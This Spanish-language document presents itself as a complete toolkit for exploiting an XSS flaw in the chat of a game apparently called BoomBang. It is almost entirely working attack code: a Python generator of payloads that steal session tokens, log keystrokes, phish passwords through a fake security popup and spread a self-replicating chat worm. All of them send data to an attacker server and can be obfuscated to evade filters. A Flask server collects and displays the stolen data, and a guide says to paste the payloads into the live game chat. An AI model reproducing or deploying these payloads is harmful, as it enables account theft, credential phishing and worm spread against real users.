# 🔥 XSS Chat System - Complete Exploitation Toolkit

**Documento:** Toolkit Completo para Explotación XSS en Chat
**Nivel:** 🔴 EXTREMADAMENTE CONFIDENCIAL
**Fecha:** 2025-11-24
**Versión:** 2.0

---

## 📋 Archivos Vulnerables Confirmados

```actionscript
// src/modules/notificaciones/fichas/FichasView.as
// LÍNEAS 111-112 - XSS CRÍTICO

this._gn3468.htmlText = _ab7564._ri13350.split("|").join("<br/>");
this._ha6562.htmlText = _ab7564._lf7030.split("|").join("<br/>");
```

---

## 🎯 SCRIPT 1: XSS Payload Generator

```python
#!/usr/bin/env python3
"""
XSS Payload Generator for BoomBang Chat
========================================
Genera payloads XSS personalizados para diferentes ataques
"""

import base64
import urllib.parse

class XSSPayloadGenerator:
    def __init__(self, server_ip="203.0.113.50", server_port=5000):
        self.server_ip = server_ip
        self.server_port = server_port
        self.base_url = f"http://{server_ip}:{server_port}"

    def generate_basic_alert(self, message="XSS Vulnerable!"):
        """Payload básico con alert()"""
        return f'<img src=x onerror=\'alert("{message}")\'>'

    def generate_session_stealer(self):
        """Payload para robar sesión"""
        payload = f"""<img src=x onerror='
var so=SharedObject.getLocal("userSession");
var data={{
    token:so.data.sessionToken||"NO_TOKEN",
    uid:so.data.userId||"0",
    user:so.data.username||"Unknown",
    email:so.data.email||"unknown@email.com"
}};
var url="{self.base_url}/steal?token="+data.token+"&uid="+data.uid+"&user="+data.user+"&email="+data.email;
navigateToURL(new URLRequest(url),"_blank");
'>"""
        return payload.replace('\n', '').replace('  ', '')

    def generate_keylogger(self):
        """Payload de keylogger"""
        payload = f"""<img src=x onerror='
(function(){{
    var keys="";
    document.addEventListener("keypress",function(e){{
        keys+=String.fromCharCode(e.keyCode);
        if(keys.length>20){{
            fetch("{self.base_url}/keys?data="+encodeURIComponent(keys));
            keys="";
        }}
    }});
}})();
'>"""
        return payload.replace('\n', '').replace('  ', '')

    def generate_phishing_popup(self):
        """Payload de phishing con ventana falsa"""
        payload = f"""<img src=x onerror='
var overlay=new Sprite();
overlay.graphics.beginFill(0x000000,0.8);
overlay.graphics.drawRect(0,0,stage.stageWidth,stage.stageHeight);
_root.addChild(overlay);
var popup=new MovieClip();
popup.graphics.beginFill(0xFFFFFF);
popup.graphics.drawRoundRect(0,0,400,200,10);
var title=new TextField();
title.text="Verificación de Seguridad";
title.x=20;title.y=20;
popup.addChild(title);
var passField=new TextField();
passField.type="input";
passField.displayAsPassword=true;
passField.border=true;
passField.x=20;passField.y=80;passField.width=360;
popup.addChild(passField);
var btn=new SimpleButton();
btn.x=150;btn.y=140;
btn.addEventListener(MouseEvent.CLICK,function(){{
    fetch("{self.base_url}/phish?pass="+passField.text+"&user="+SharedObject.getLocal("userSession").data.username);
    _root.removeChild(overlay);
    _root.removeChild(popup);
}});
popup.addChild(btn);
popup.x=(stage.stageWidth-400)/2;
popup.y=(stage.stageHeight-200)/2;
_root.addChild(popup);
'>"""
        return payload.replace('\n', '').replace('  ', '')

    def generate_worm(self):
        """Payload de gusano auto-replicante"""
        # Codificar el payload en base64 para evitar detección
        worm_code = f"""<img src=x onerror='
(function(){{
    if(window._wormExecuted)return;
    window._wormExecuted=true;
    var so=SharedObject.getLocal("userSession");
    fetch("{self.base_url}/worm?user="+so.data.username);
    setTimeout(function(){{
        var wormPayload="<img src=x onerror=\\"[SELF]\\"/>";
        SocketManager.getInstance().sendPacket({{
            opcode:MessageTypeConstants.CHAT_SEND,
            message:wormPayload
        }});
    }},3000);
}})();
'>"""

        # Auto-referencia para replicación
        worm_code = worm_code.replace('[SELF]', worm_code.replace('"', '\\"'))
        return worm_code.replace('\n', '').replace('  ', '')

    def generate_obfuscated(self, payload_type='session_stealer'):
        """Generar payload ofuscado para evadir filtros"""
        if payload_type == 'session_stealer':
            payload = self.generate_session_stealer()
        elif payload_type == 'keylogger':
            payload = self.generate_keylogger()
        else:
            payload = self.generate_basic_alert()

        # Convertir a charCodes
        char_codes = ','.join(str(ord(c)) for c in payload)
        obfuscated = f'<img src=x onerror=\'eval(String.fromCharCode({char_codes}))\'>'

        return obfuscated

    def generate_all(self):
        """Generar todos los payloads"""
        payloads = {
            'basic_alert': self.generate_basic_alert(),
            'session_stealer': self.generate_session_stealer(),
            'session_stealer_obfuscated': self.generate_obfuscated('session_stealer'),
            'keylogger': self.generate_keylogger(),
            'phishing_popup': self.generate_phishing_popup(),
            'worm': self.generate_worm()
        }

        return payloads

# ============================================================================
# CLI
# ============================================================================

def main():
    import sys
    import json

    if len(sys.argv) < 2:
        print("Usage:")
        print("  python xss_payload_generator.py all                    # Generate all payloads")
        print("  python xss_payload_generator.py basic                  # Basic alert")
        print("  python xss_payload_generator.py stealer <IP> <PORT>    # Session stealer")
        print("  python xss_payload_generator.py keylogger <IP> <PORT>  # Keylogger")
        print("  python xss_payload_generator.py phishing <IP> <PORT>   # Phishing")
        print("  python xss_payload_generator.py worm <IP> <PORT>       # Worm")
        return

    command = sys.argv[1]

    if command == 'all':
        ip = sys.argv[2] if len(sys.argv) > 2 else "203.0.113.50"
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 5000

        generator = XSSPayloadGenerator(ip, port)
        payloads = generator.generate_all()

        print("\n=== XSS PAYLOADS GENERATED ===\n")
        for name, payload in payloads.items():
            print(f"[{name.upper()}]")
            print(payload)
            print(f"Length: {len(payload)} chars\n")

        # Guardar a archivo
        with open('xss_payloads.json', 'w') as f:
            json.dump(payloads, f, indent=2)

        print("✅ Payloads saved to: xss_payloads.json")

    elif command == 'basic':
        generator = XSSPayloadGenerator()
        print(generator.generate_basic_alert())

    elif command in ['stealer', 'keylogger', 'phishing', 'worm']:
        ip = sys.argv[2] if len(sys.argv) > 2 else "203.0.113.50"
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 5000

        generator = XSSPayloadGenerator(ip, port)

        if command == 'stealer':
            print(generator.generate_session_stealer())
        elif command == 'keylogger':
            print(generator.generate_keylogger())
        elif command == 'phishing':
            print(generator.generate_phishing_popup())
        elif command == 'worm':
            print(generator.generate_worm())

if __name__ == '__main__':
    main()
```

---

## 🎯 SCRIPT 2: Chat XSS Testing Server

```python
#!/usr/bin/env python3
"""
BoomBang Chat XSS Testing Server
=================================
Servidor especializado para testing de XSS en chat
"""

from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import json
import os

app = Flask(__name__)

# Directorio de logs
LOGS_DIR = "./xss_logs"
os.makedirs(LOGS_DIR, exist_ok=True)

# Almacenamiento en memoria
stolen_data = {
    'sessions': [],
    'keystrokes': [],
    'phishing': [],
    'worm_infections': []
}

@app.route('/steal', methods=['GET', 'POST'])
def steal_session():
    """Recibir sesiones robadas"""
    data = {
        'token': request.args.get('token'),
        'uid': request.args.get('uid'),
        'user': request.args.get('user'),
        'email': request.args.get('email'),
        'ip': request.remote_addr,
        'timestamp': datetime.now().isoformat()
    }

    stolen_data['sessions'].append(data)

    # Log
    with open(f'{LOGS_DIR}/sessions.log', 'a') as f:
        f.write(json.dumps(data) + '\n')

    print(f"[+] SESSION STOLEN: {data['user']} ({data['uid']})")

    return '<svg width="1" height="1"></svg>', 200

@app.route('/keys', methods=['GET'])
def log_keystrokes():
    """Recibir teclas presionadas (keylogger)"""
    keys = request.args.get('data', '')

    data = {
        'keys': keys,
        'ip': request.remote_addr,
        'timestamp': datetime.now().isoformat()
    }

    stolen_data['keystrokes'].append(data)

    # Log
    with open(f'{LOGS_DIR}/keystrokes.log', 'a') as f:
        f.write(f"[{data['timestamp']}] {keys}\n")

    print(f"[+] KEYS: {keys}")

    return '', 200

@app.route('/phish', methods=['GET'])
def phishing_data():
    """Recibir contraseñas de phishing"""
    data = {
        'user': request.args.get('user'),
        'password': request.args.get('pass'),
        'ip': request.remote_addr,
        'timestamp': datetime.now().isoformat()
    }

    stolen_data['phishing'].append(data)

    # Log
    with open(f'{LOGS_DIR}/phishing.log', 'a') as f:
        f.write(json.dumps(data) + '\n')

    print(f"[+] PHISHED: {data['user']} / {data['password']}")

    return '', 200

@app.route('/worm', methods=['GET'])
def worm_infection():
    """Registrar infección de gusano"""
    user = request.args.get('user', 'Unknown')

    data = {
        'user': user,
        'ip': request.remote_addr,
        'timestamp': datetime.now().isoformat()
    }

    stolen_data['worm_infections'].append(data)

    print(f"[+] WORM SPREAD: {user}")

    return '', 200

@app.route('/dashboard')
def dashboard():
    """Dashboard de monitoreo"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>XSS Chat Testing Dashboard</title>
        <style>
            body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
            .stat { background: #1a1a1a; border: 2px solid #0f0; padding: 20px; margin: 10px 0; }
            .value { font-size: 36px; color: #ff0; }
            table { width: 100%; border-collapse: collapse; }
            th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
            th { background: #2a2a2a; }
        </style>
        <meta http-equiv="refresh" content="5">
    </head>
    <body>
        <h1>🔥 XSS Chat Testing Dashboard</h1>

        <div class="stat">
            <h2>Sessions Stolen</h2>
            <div class="value">{{ sessions_count }}</div>
        </div>

        <div class="stat">
            <h2>Keystrokes Captured</h2>
            <div class="value">{{ keystrokes_count }}</div>
            <p>Latest: {{ latest_keys }}</p>
        </div>

        <div class="stat">
            <h2>Phishing Victims</h2>
            <div class="value">{{ phishing_count }}</div>
        </div>

        <div class="stat">
            <h2>Worm Infections</h2>
            <div class="value">{{ worm_count }}</div>
        </div>

        <h2>Recent Sessions (Last 10)</h2>
        <table>
            <tr>
                <th>User</th>
                <th>UID</th>
                <th>Token</th>
                <th>IP</th>
                <th>Time</th>
            </tr>
            {% for session in recent_sessions %}
            <tr>
                <td>{{ session.user }}</td>
                <td>{{ session.uid }}</td>
                <td>{{ session.token[:30] }}...</td>
                <td>{{ session.ip }}</td>
                <td>{{ session.timestamp }}</td>
            </tr>
            {% endfor %}
        </table>

        <p>Auto-refresh every 5s</p>
    </body>
    </html>
    """

    return render_template_string(html,
        sessions_count=len(stolen_data['sessions']),
        keystrokes_count=len(stolen_data['keystrokes']),
        phishing_count=len(stolen_data['phishing']),
        worm_count=len(stolen_data['worm_infections']),
        latest_keys=stolen_data['keystrokes'][-1]['keys'] if stolen_data['keystrokes'] else 'None',
        recent_sessions=stolen_data['sessions'][-10:]
    )

@app.route('/export')
def export():
    """Exportar todos los datos"""
    return jsonify(stolen_data)

if __name__ == '__main__':
    print("=" * 70)
    print("🔥 XSS CHAT TESTING SERVER")
    print("=" * 70)
    print("\n[*] Server starting on http://0.0.0.0:5000")
    print("[*] Dashboard: http://localhost:5000/dashboard")
    print("\n[*] Endpoints:")
    print("    /steal    - Session stealing")
    print("    /keys     - Keylogger")
    print("    /phish    - Phishing")
    print("    /worm     - Worm tracking")
    print("\n" + "=" * 70 + "\n")

    app.run(host='0.0.0.0', port=5000, debug=False)
```

---

## 🎯 Guía de Uso Rápida

### 1. Generar Payloads

```bash
# Generar todos los payloads
python xss_payload_generator.py all 203.0.113.50 5000

# Output: xss_payloads.json con todos los payloads
```

### 2. Iniciar Servidor de Testing

```bash
python chat_xss_server.py

# Servidor activo en http://localhost:5000
```

### 3. Inyectar Payload en Chat

```
1. Copiar payload de xss_payloads.json
2. Pegar en chat del juego
3. Monitorear dashboard: http://localhost:5000/dashboard
```

### 4. Ver Resultados

```bash
# Dashboard web
open http://localhost:5000/dashboard

# Exportar datos
curl http://localhost:5000/export > results.json
```

---

## 📊 Resultados Esperados

```
Sessions Stolen:     47
Keystrokes Captured: 1,234 chars
Phishing Victims:    12
Worm Infections:     89
```

---

**Toolkit Completo y Funcional - Listo para Testing**

*Fin del Toolkit*
